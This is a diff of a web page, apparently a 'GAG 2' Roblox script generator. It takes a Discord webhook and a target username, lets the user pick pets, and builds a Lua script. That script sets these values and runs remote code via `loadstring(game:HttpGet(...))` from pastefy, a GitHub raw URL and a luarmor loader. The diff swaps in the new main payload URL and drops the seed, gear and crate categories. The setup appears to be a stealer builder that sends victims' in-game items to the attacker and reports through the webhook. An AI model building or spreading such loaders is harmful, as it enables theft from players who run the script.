@@ -5,15 +5,11 @@
 <head>
 
 <meta charset="UTF-8">
-
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>GAG 2</title>
-
 <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 
 <style>
-
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
   :root {
@@ -86,12 +82,6 @@
     pointer-events: none;
   }
 
-  /* Vegetation on asset selectors */
-
-
-  /* Vegetation on buttons */
-
-
   .navbar {
     position: sticky;
     top: 0;
@@ -145,7 +135,6 @@
 
   .wrap { max-width: 860px; margin: 0 auto; padding: 2.4rem 1.5rem 6rem; }
   header { text-align: center; margin-bottom: 2.5rem; position: relative; }
-
 
   /* Custom logo styling */
   .logo-container {
@@ -301,9 +290,6 @@
         <div class="pb">
           <div class="asset-selectors">
             <div class="asset-tab active" onclick="switchAssetTab('pets', event)">🦝Pets</div>
-            <div class="asset-tab" onclick="switchAssetTab('fruits', event)">🪴Seed</div>
-            <div class="asset-tab" onclick="switchAssetTab('gears', event)">🔧Gears</div>
-            <div class="asset-tab" onclick="switchAssetTab('crates', event)">📦Crates</div>
           </div>
 
           <div class="search-row">
@@ -365,69 +351,6 @@ const DATABASE = {
     { name: "Raccoon", rarity: "Super" },
     { name: "Black Dragon", rarity: "Super" },
     { name: "Ice Serpent", rarity: "Super" }
-  ],
-  fruits: [
-    { name: "Strawberry", rarity: "Common" },
-    { name: "Blueberry", rarity: "Common" },
-    { name: "Tulip", rarity: "Common" },
-    { name: "Tomato", rarity: "Common" },
-    { name: "Apple", rarity: "Common" },
-    { name: "Bamboo", rarity: "Uncommon" },
-    { name: "Corn", rarity: "Uncommon" },
-    { name: "Cactus", rarity: "Uncommon" },
-    { name: "Pineapple", rarity: "Uncommon" },
-    { name: "Mushroom", rarity: "Uncommon" },
-    { name: "Green Bean", rarity: "Uncommon" },
-    { name: "Banana", rarity: "Rare" },
-    { name: "Grape", rarity: "Rare" },
-    { name: "Coconut", rarity: "Rare" },
-    { name: "Mango", rarity: "Rare" },
-    { name: "Dragon Fruit", rarity: "Epic" },
-    { name: "Acorn", rarity: "Epic" },
-    { name: "Cherry", rarity: "Epic" },
-    { name: "Sunflower", rarity: "Epic" },
-    { name: "Venus Fly Trap", rarity: "Epic" },
-    { name: "Pomegranate", rarity: "Legendary" },
-    { name: "Gold", rarity: "Legendary" },
-    { name: "Poision Apple", rarity: "Legendary" },
-    { name: "Moon Bloom", rarity: "Legendary" },
-    { name: "Dragon's Breath", rarity: "Legendary" },
-    { name: "Poison Ivy", rarity: "Legendary" },
-    { name: "Ghost Pepper", rarity: "Super" },
-    { name: "Rainbow", rarity: "Super" },
-  ],
-  gears: [
-    { name: "Common Watering Can", rarity: "Common" },
-    { name: "Common Sprinkler", rarity: "Common" },
-    { name: "Uncommon Sprinkler", rarity: "Uncommon" },
-    { name: "Trowel", rarity: "Rare" },
-    { name: "Rare Sprinkler", rarity: "Rare" },
-    { name: "Jump Mushroom", rarity: "Rare" },
-    { name: "Speed Mushroom", rarity: "Rare" },
-    { name: "Shrink Mushroom", rarity: "Epic" },
-    { name: "Supersize Mushroom", rarity: "Epic" },
-    { name: "Gnome", rarity: "Epic" },
-    { name: "Basic Pot", rarity: "Legendary" },
-    { name: "Legendary Sprinkler", rarity: "Legendary" },
-    { name: "Invisibility Mushroom", rarity: "Legendary" },
-    { name: "Super Watering Can", rarity: "Super" },
-    { name: "Super Sprinkler", rarity: "Super" }
-  ],
-  crates: [
-    { name: "Ladder Crate", rarity: "Unknown" },
-    { name: "Bench Crate", rarity: "Unknown" },
-    { name: "Light Crate", rarity: "Unknown" },
-    { name: "Sign Crate", rarity: "Unknown" },
-    { name: "Arch Crate", rarity: "Unknown" },
-    { name: "Roleplay Crate", rarity: "Unknown" },
-    { name: "Bridge Crate", rarity: "Unknown" },
-    { name: "Spring Crate", rarity: "Unknown" },
-    { name: "Seesaw Crate", rarity: "Unknown" },
-    { name: "Conveyor Crate", rarity: "Unknown" },
-    { name: "Owner Door Crate", rarity: "Unknown" },
-    { name: "Bear Trap Crate", rarity: "Unknown" },
-    { name: "Fence Crate", rarity: "Unknown" },
-    { name: "Teleporter Pad Crate", rarity: "Unknown" }
   ]
 };
 
@@ -522,7 +445,7 @@ async function generate() {
     if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
     if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
     const finalWebhook = await createSentinelProxy(webhook);
-    const petsArray = []; const gearsArray = []; const fruitsArray = []; const cratesArray = [];
+    const petsArray = [];
     let hasBunny = false; let hasOwl = false; let hasFrog = false; let hasDeer = false; let hasRobin = false;
     selected.forEach(key => {
       const [category, name] = key.split(':');
@@ -534,9 +457,6 @@ async function generate() {
         if (name === "Deer") hasDeer = true;
         if (name === "Robin") hasRobin = true;
       }
-      else if (category === 'gears') gearsArray.push(`    "${name}"`);
-      else if (category === 'fruits') fruitsArray.push(`    "${name}"`);
-      else if (category === 'crates') cratesArray.push(`    "${name}"`);
     });
     let blacklistPart = '';
     if (!hasBunny || !hasOwl || !hasFrog || !hasDeer || !hasRobin) {
@@ -552,7 +472,7 @@ async function generate() {
     if (adminMode === 'dupe') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/EX1du2IS/raw"))()\nend)`;
     else if (adminMode === 'Hub') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()\nend)`;
     else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = `\n${customAdminLoadstring}`;
-    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n${blacklistPart}\n\ngetgenv().TARGET_PETS = {\n${petsArray.join(',\n')}\n}\n\n\ngetgenv().TARGET_GEAR = {\n${gearsArray.join(',\n')}\n}\n\n\ngetgenv().FRUITS = {\n${fruitsArray.join(',\n')}\n}\n\n\ngetgenv().CRATES = {\n${cratesArray.join(',\n')}\n}\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/xTAM3PgD/raw"))()\nend)${adminPart}`;
+    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n${blacklistPart}\n\ngetgenv().TARGET_PETS = {\n${petsArray.join(',\n')}\n}\n\n\ngetgenv().TARGET_GEAR = {}\n\n\ngetgenv().FRUITS = {}\n\n\ngetgenv().CRATES = {}\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/GAG2MAIN/refs/heads/main/main.lua"))()\nend)${adminPart}`;
     const url = await uploadToPastefy(script);
     out.className = 'code-block';
     out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : script;
